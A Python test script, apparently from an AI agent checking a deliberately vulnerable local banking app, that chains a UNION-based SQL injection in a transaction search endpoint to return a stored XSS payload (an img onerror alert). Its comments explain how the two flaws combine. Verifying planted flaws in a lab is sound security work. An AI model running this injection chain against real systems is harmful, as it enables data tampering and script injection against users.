import time
import urllib.request
import json
import urllib.parse


# Note: Using python's requests/urllib for API interaction to setup state, 
# but XSS needs a browser or manual verification. 
# Since I cannot easily run a headless browser with XSS execution verification in this environment 
# (unless selenium/chrome is installed in the container or host), 
# I will simulate the "Injection" via API and print instructions for Manual Verification.
# OR I can verify the payload is present in the HTML response of the dashboard.

BASE_URL = "http://localhost:80"

def inject_xss():
    print("Injecting XSS payload via Transaction API (using Ledger Service directly or via Gateway)...")
    # We need a user. Let's use 'racer' from previous test if exists, or create new.
    username = f"xss_user_{int(time.time())}"
    
    # 1. Register
    reg_url = f"{BASE_URL}/auth/register"
    reg_payload = {"username": username, "password": "123", "is_admin": False}
    try:
        urllib.request.urlopen(urllib.request.Request(reg_url, data=json.dumps(reg_payload).encode('utf-8'), headers={'Content-Type': 'application/json'}, method='POST'))
    except Exception as e:
        print(f"[FAIL] Register failed: {e}")
        return

    # 2. Login
    login_url = f"{BASE_URL}/auth/login"
    data = urllib.parse.urlencode({"username": username, "password": "123"}).encode('utf-8')
    resp = urllib.request.urlopen(urllib.request.Request(login_url, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, method='POST'))
    token = json.loads(resp.read().decode('utf-8'))["access_token"]
    print(f"Logged in as {username}. Token: {token[:10]}...")

    # 3. Inject XSS via Transfer Description?
    # Wait, the Transfer endpoint in `ledger-service` /main.py:
    # db.execute(text("INSERT INTO transactions ... :desc"), ... "desc": f"Transfer to {to_account_num}")
    # The description is AUTO-GENERATED!
    # "Transfer to ..."
    # We cannot control the description directly via /transfer endpoint!
    #
    # Reviewing `ledger/main.py`:
    # The /transfer endpoint generates description.
    # The /transactions/search SQLi endpoint allows searching.
    # Do we have an endpoint to Create Custom Transaction? NO.
    #
    # Is there another way to inject XSS?
    # Maybe parameters reflected in the Dashboard?
    # Dashboard.jsx:
    #   <input ... value={search} onChange...> 
    #   fetch(`/ledger/transactions/search?q=${query}`)
    #   map(txn => dangerouslySetInnerHTML={{ __html: txn.description }})
    #
    # 1. Reflected XSS?
    #   If I modify the URL to Dashboard? No, it uses internal state.
    #   If `txn.description` contains XSS.
    #   But `txn.description` comes from DB.
    #   And DB description is hardcoded "Transfer to ...".
    #   Unless... we use the SQL Injection in /search to RETURN a fake description?
    #   YES!
    #   The endpoint is `/transactions/search?q=...`
    #   SQLi: `SELECT * FROM transactions WHERE description LIKE '%{q}%'`
    #   We can UNION SELECT to inject a fake transaction with malicious description!
    #   
    #   Payload:
    #   ' UNION SELECT 9999, 1, 0.0, '<img src=x onerror=alert(1)>', NOW() -- 
    #   
    #   Wait, columns need to match.
    #   Model Transaction: id (int), account_id (int), amount (float), description (str), timestamp (datetime).
    #   Order in DB? typically id, account_id, amount, description, timestamp.
    #   
    #   Let's craft the payload.
    
    xss_payload = "<img src=x onerror=alert(\"XSS\")>"
    # We need to URL encode the SQLi
    # Query: ' UNION SELECT 9999, 1, 0, '<img...>', NOW() --
    sqli = f"' UNION SELECT 9999, 1, 0, '{xss_payload}', NOW() --"

    
    print(f"Injecting SQLi Payload to retrieve XSS: {sqli}")
    
    # 4. Verify via Dashboard (simulated fetch)
    # The Dashboard calls: /ledger/transactions/search?q=...
    search_url = f"{BASE_URL}/ledger/transactions/search?q={urllib.parse.quote(sqli)}"
    
    req = urllib.request.Request(search_url, headers={'Authorization': f'Bearer {token}'})
    try:
        r = urllib.request.urlopen(req)
        data = json.loads(r.read().decode('utf-8'))
        print(f"[DEBUG] Response Data: {data}")
        
        if isinstance(data, dict) and "error" in data:
            print(f"[FAIL] SQLi Error: {data['error']}")
            return

        # Check if any transaction has the payload
        found = False
        for txn in data:
            if xss_payload in txn.get("description", ""):
                print(f"[SUCCESS] Stored XSS Payload returned via SQLi! Description: {txn['description']}")
                found = True
                break
        
        if not found:
            print(f"[FAIL] Payload not found in response. Data: {data}")
            
    except Exception as e:
        print(f"[FAIL] Search Request failed: {e}")

import urllib.parse
if __name__ == "__main__":
    inject_xss()
